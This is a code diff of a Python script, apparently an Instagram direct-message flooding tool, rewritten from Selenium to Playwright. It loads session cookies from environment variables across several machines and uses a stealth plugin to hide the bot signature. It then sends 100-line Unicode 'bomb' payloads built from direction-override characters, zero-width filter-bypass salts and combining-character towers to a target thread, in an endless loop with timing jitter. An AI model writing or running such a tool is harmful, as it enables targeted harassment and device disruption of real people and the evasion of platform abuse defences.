@@ -1,93 +1,86 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (100-LINE PAPA EDITION)
-# 📅 STATUS: 10-MACHINES | 3-IDS | STABILITY-MAX
+# 🚀 PROJECT: PRAVEER.OWNS (PLAYWRIGHT EDITION)
+# 📅 STATUS: ASYNC-STRIKE | STEALTH-V4 | 100-LINE PAPA
 
-import os, time, random, sys
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+import os, asyncio, random, sys
+from playwright.async_api import async_playwright
+from playwright_stealth import stealth_async
 
 def get_kernel_stop_payload(target_name):
-    """Ultimate 100-Line Vertical Saturation Payload."""
-    u_id = random.randint(1000, 9999)
-    header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}\n"
-    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\u2066", "\u2067"]) for _ in range(50))
-    z_tower = "̸" * 45 # Balanced for 100-line limit
+    u_id = random.randint(10000, 99999)
+    # Adding unique salt to bypass ghosting filters
+    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d"], k=8))
+    header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}{salt}\n"
+    
+    z_tower = "̸" * 30 # Balanced for 100 lines
     width_bomb = "\u2800\u00A0" * 40
     lines = [header]
-    
     for i in range(100):
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        styled_tag = "ＰＡＰＡ" if i % 2 == 0 else "ＯＮ ＴＯＰ"
-        lines.append(f"{width_bomb}{prefix}{styled_tag}{z_tower}{shifter}")
-    
+        noise = "".join(random.choices("ABC123", k=3))
+        lines.append(f"{width_bomb}{prefix}ＰＡＰＡ_{noise}{z_tower}")
     return "\n".join(lines)[:9990]
 
-def get_driver():
-    chrome_options = Options()
-    chrome_options.add_argument("--headless=new")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--disable-dev-shm-usage")
-    chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument("--window-size=1920,1080")
-    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
-    return webdriver.Chrome(options=chrome_options)
+async def agent_blitz(machine_id, cookie_list, target_id, target_name):
+    cookie_index = (machine_id - 1) % len(cookie_list)
+    current_cookie = cookie_list[cookie_index].strip()
 
-def main():
-    machine_id = int(os.environ.get("MACHINE_ID", "1"))
-    raw_cookies = os.environ.get("SESSION_ID", "").split(",")
-    target_id = os.environ.get("GROUP_URL", "").strip()
-    target_name = os.environ.get("TARGET_NAME", "Target").strip()
-
-    cookie_index = (machine_id - 1) % len(raw_cookies)
-    current_cookie = raw_cookies[cookie_index].strip()
-    
-    driver = None
-    try:
-        driver = get_driver()
-        driver.get("https://www.instagram.com/robots.txt")
-        time.sleep(3)
+    async with async_playwright() as p:
+        # 🚀 Launching a high-performance Chromium instance
+        browser = await p.chromium.launch(headless=True)
+        # 🎭 Context Isolation (Mimics a clean incognito session)
+        context = await browser.new_context(
+            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        )
+        page = await context.new_page()
         
-        driver.add_cookie({
-            'name': 'sessionid', 
-            'value': current_cookie, 
-            'domain': '.instagram.com', 
-            'path': '/', 
-            'secure': True
-        })
+        # 🛡️ APPLY STEALTH (Hides the bot signature)
+        await stealth_async(page)
         
-        driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
-        wait = WebDriverWait(driver, 60)
+        try:
+            print(f"📡 [M{machine_id}] Injecting Session ID...")
+            # visit robots.txt to set domain context
+            await page.goto("https://www.instagram.com/robots.txt")
+            await context.add_cookies([{
+                "name": "sessionid",
+                "value": current_cookie,
+                "domain": ".instagram.com",
+                "path": "/",
+                "secure": True
+            }])
 
-        while True:
-            try:
-                # RE-FIND BOX EVERY TIME to prevent StaleElementReferenceException
-                box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
-                
-                for _ in range(2): # Double-Pulse
-                    payload = get_kernel_stop_payload(target_name)
-                    driver.execute_script("arguments[0].innerText = arguments[1];", box, payload)
-                    box.send_keys(Keys.ENTER)
-                    time.sleep(1.5)
-
-                print(f"💀 [Machine {machine_id}] 100-Line Pulse Delivered.")
-                time.sleep(random.uniform(15, 22)) # Stealth wait
-                
-                if random.random() < 0.1:
-                    driver.refresh()
-                    time.sleep(10)
+            print(f"📡 [M{machine_id}] Locking Target...")
+            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="networkidle")
             
-            except Exception:
-                time.sleep(5)
-                continue
+            # ⏳ Smart Wait for the textbox
+            await page.wait_for_selector("//div[@role='textbox']", timeout=60000)
 
-    except Exception as e:
-        print(f"❌ [Machine {machine_id}] Error: {str(e)[:50]}")
-        if driver: driver.quit()
-        sys.exit(1)
+            while True:
+                # 🔥 DOUBLE-TAP PULSE
+                for _ in range(2):
+                    payload = get_kernel_stop_payload(target_name)
+                    # Playwright handles complex text injection much faster than Selenium
+                    await page.fill("//div[@role='textbox']", payload)
+                    await page.keyboard.press("Enter")
+                    print(f"💀 [M{machine_id}] Playwright Pulse Delivered.")
+                    await asyncio.sleep(2)
+
+                # Stealth Jitter (15-20s)
+                await asyncio.sleep(random.uniform(15, 20))
+
+                # Periodic Memory Flush
+                if random.random() < 0.1:
+                    await page.reload(wait_until="networkidle")
+
+        except Exception as e:
+            print(f"⚠️ [M{machine_id}] Error: {str(e)[:50]}. Restarting machine...")
+            await browser.close()
+            sys.exit(1)
 
 if __name__ == "__main__":
-    main()
+    m_id = int(os.environ.get("MACHINE_ID", "1"))
+    cookies = os.environ.get("SESSION_ID", "").split(",")
+    t_id = os.environ.get("GROUP_URL", "").strip()
+    t_name = os.environ.get("TARGET_NAME", "Target").strip()
+    
+    asyncio.run(agent_blitz(m_id, cookies, t_id, t_name))
